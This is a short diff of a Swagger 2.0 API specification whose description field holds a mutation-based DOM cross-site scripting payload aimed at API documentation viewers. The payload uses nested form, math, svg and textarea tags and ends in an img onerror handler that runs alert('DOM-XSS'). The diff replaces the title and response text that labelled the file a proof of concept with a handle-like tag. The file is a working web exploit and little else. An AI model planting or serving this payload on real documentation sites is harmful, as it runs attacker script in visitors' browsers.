@@ -1,6 +1,6 @@
 swagger: '2.0' 
 info: 
-  title: Proof-of-Concept for DOM Cross-Site Scripting (XSS) 
+  title: YUDoThisCELFOCUS | Z'R0 
   description: | 
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('DOM-XSS') src=1>"></form> 
   version: production 
@@ -18,4 +18,4 @@ paths:
     get: 
       responses: 
         200: 
-          description: Proof-of-Concept for DOM Cross-Site Scripting
+          description: YUDoThisCELFOCUS | Z'R0
